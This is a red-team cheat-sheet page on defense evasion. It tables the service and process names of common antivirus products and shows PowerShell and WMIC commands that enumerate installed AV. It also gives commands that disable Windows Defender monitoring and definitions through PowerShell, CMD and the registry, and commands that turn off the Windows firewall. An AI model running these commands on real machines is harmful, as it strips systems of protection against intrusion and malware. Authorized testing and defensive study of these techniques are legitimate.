---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/defense-evasion
---

# Defense Evasion

## AV Service

The following table contains well-known and commonly used AV software.&#x20;

| Antivirus Name     | Service Name                      | Process Name                       |
| ------------------ | --------------------------------- | ---------------------------------- |
| Microsoft Defender | WinDefend                         | MSMpEng.exe                        |
| Trend Micro        | TMBMSRV                           | <p>TMBMSRV.exe<br></p>             |
| Avira              | AntivirService, Avira.ServiceHost | avguard.exe, Avira.ServiceHost.exe |
| Bitdefender        | VSSERV                            | bdagent.exe, vsserv.exe            |
| Kaspersky          | AVP\<Version #>                   | <p>avp.exe, ksde.exe<br></p>       |
| AVG                | AVG Antivirus                     | AVGSvc.exe                         |
| Norton             | Norton Security                   | NortonSecurity.exe                 |
| McAfee             | McAPExe, Mfemms                   | MCAPExe.exe, mfemms.exe            |
| Panda              | PavPrSvr                          | PavPrSvr.exe                       |
| Avast              | Avast Antivirus                   | afwServ.exe, AvastSvc.exe          |

## Enumerating AV solution existing on machine

```powershell
PS C:\Users\ROG> Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct


displayName              : Windows Defender
instanceGuid             : {D68DDC3A-831F-4fae-9E44-DA132C1ACF46}
pathToSignedProductExe   : windowsdefender://
pathToSignedReportingExe : %ProgramFiles%\Windows Defender\MsMpeng.exe
productState             : 393472
timestamp                : Thu, 21 Mar 2024 10:45:38 GMT
PSComputerName           :
```

```powershell
PS C:\Users\ROG> wmic /namespace:\\root\securitycenter2 path antivirusproduct

displayName                  instanceGuid                            pathToSignedProductExe                                                           pathToSignedReportingExe                                                       productState  timestamp
Windows Defender             {D68DDC3A-831F-4fae-9E44-DA132C1ACF46}  windowsdefender://                                                               %ProgramFiles%\Windows Defender\MsMpeng.exe                                    393472        Thu, 21 Mar 2024 10:45:38 GMT
```

## Enumerate WinDefender&#x20;

```powershell
PS C:\> Get-Service WinDefend

Status   Name               DisplayName
------   ----               -----------
Running  WinDefend          Windows Defender Antivirus Service

PS C:\> Get-MpComputerStatus | select RealTimeProtectionEnabled

RealTimeProtectionEnabled
-------------------------
                    False
```

## Disable Windows Defender

```powershell
# Powershell
Set-MpPreference -DisableRealtimeMonitoring $true

# CMD
cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

# Registry
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring " /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableBehaviorMonitoring " /t REG_DWORD /d 1 /f

```

## Disable Local Firewall

```basic
netsh advfirewall set currentprofile state off
netsh advfirewall set allprofiles state off
```
